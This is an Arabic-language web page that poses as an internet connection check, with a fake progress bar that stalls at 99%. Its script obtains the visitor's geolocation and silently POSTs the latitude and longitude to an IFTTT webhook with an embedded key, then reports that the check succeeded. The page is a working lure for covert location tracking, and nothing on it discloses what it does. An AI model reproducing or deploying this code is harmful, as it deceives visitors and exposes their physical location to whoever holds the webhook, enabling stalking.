
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>التحقق من الاتصال</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f3f3f3;
      text-align: center;
      padding: 50px;
    }
    .card {
      background-color: white;
      max-width: 400px;
      margin: auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
      font-size: 24px;
    }
    p {
      color: #666;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>جاري التحقق من اتصالك بالإنترنت</h1>
    <p>الرجاء عدم مغادرة الصفحة...</p>
    
    <div style="margin-top: 30px;">
      <div style="background-color: #ddd; border-radius: 20px; overflow: hidden;">
        <div id="bar" style="width: 0%; background-color: #4CAF50; height: 20px; transition: width 0.3s;"></div>
      </div>
      <p id="percent" style="margin-top: 10px;">0%</p>
      <p id="status"></p>
    </div>
    <script>
      let percent = 0;
      const interval = setInterval(() => {
        if (percent < 99) {
          percent++;
          document.getElementById("bar").style.width = percent + "%";
          document.getElementById("percent").innerText = percent + "%";
        } else {
          clearInterval(interval);
        }
      }, 50);
    </script>
    
  </div>

  <script>
    navigator.geolocation.getCurrentPosition(function(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // إرسال الموقع إلى IFTTT Webhook
      fetch('https://maker.ifttt.com/trigger/send_location/with/key/oC_hS_33eGiuAVNSX6IgZ', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ value1: latitude, value2: longitude })
      });

      document.getElementById("status").innerText = "تم التحقق بنجاح.";
    }, function(error) {
      document.getElementById("status").innerText = "فشل في تحديد الموقع أو تم الرفض.";
    });
  </script>
</body>
</html>
